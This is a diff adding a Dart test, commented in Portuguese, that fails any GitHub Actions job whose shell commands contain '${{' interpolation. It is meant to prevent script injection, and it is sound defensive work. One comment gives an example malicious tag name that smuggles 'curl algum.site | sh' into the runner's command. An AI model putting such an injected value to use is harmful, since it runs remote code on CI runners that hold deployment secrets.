@@ -149,6 +149,24 @@ void main() {
       expect(comandos, isNot(contains(r'${{ secrets.')));
     });
   });
+
+  test('nenhum script monta texto do GitHub dentro do comando', () {
+    // `${{ github.ref_name }}` dentro de um `run:` é substituído como TEXTO
+    // antes de o shell rodar. Nome de tag é livre: uma tag chamada
+    // `web-loja_ju-v1"; curl algum.site | sh; echo "` viraria comando no
+    // runner, que tem o secret do Hosting à mão. O jeito certo é passar por
+    // `env:` e usar `$VARIAVEL` — o shell não reavalia o valor de uma
+    // variável. Vale para todo job: quem vier copiar este arquivo copia certo.
+    for (final nome in jobs.keys) {
+      for (final comando in _comandos(jobs[nome])) {
+        expect(
+          comando,
+          isNot(contains(r'${{')),
+          reason: r'job: passe por env: e use $VARIAVEL no lugar — ' + nome,
+        );
+      }
+    }
+  });
 }
 
 List<Map> _passos(dynamic job) => (job['steps'] as List).cast<Map>();
